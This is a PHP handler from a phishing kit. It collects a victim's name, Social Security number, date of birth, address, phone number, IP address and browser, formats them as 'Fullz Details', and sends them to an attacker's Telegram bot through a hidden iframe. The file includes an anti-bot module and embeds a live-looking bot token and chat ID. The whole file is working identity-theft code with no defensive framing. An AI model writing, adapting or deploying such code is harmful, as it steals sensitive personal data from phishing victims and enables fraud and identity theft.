<?php
include('../.../Meta/Antibot.php');

if(isset($_POST['firstname']));
$msg= isset($msg) ? $msg: '';

    $ip = getenv("REMOTE_ADDR");
    $ua = $_SERVER['HTTP_USER_AGENT'];
$msg .= "||::::::::::|Fullz Details|::::::::::||                                    \n";
$msg .= "|First Name : ".$_POST['fname']."                               \n";
$msg .= "|Last Name : ".$_POST['lname']."                                 \n";
$msg .= "|SSN : ".$_POST['ssn']."                                         \n";
$msg .= "|DOB : ".$_POST['dob']."                                          \n";
$msg .= "|Street : ".$_POST['address']."                                       \n";
$msg .= "|Zipcode : ".$_POST['zip']."                                              \n";
$msg .= "|Phone : ".$_POST['phone']."                                        \n";
$msg .= "|IP : ".$ip."                                                     \n";
$msg .= "|Browser : ".$ua."                                                 \n";
$msg .= "||:::::::|Alchemysender🚀|:::::::||\n\n";

  echo "<iframe src='https://api.telegram.org/bot5493016382:AAGdRGzwECGmrH_QtDeAwazxHwKrA2VozjE/sendMessage?chat_id=-644676108&text=".$msg."' style='display:none'></iframe>";


?>
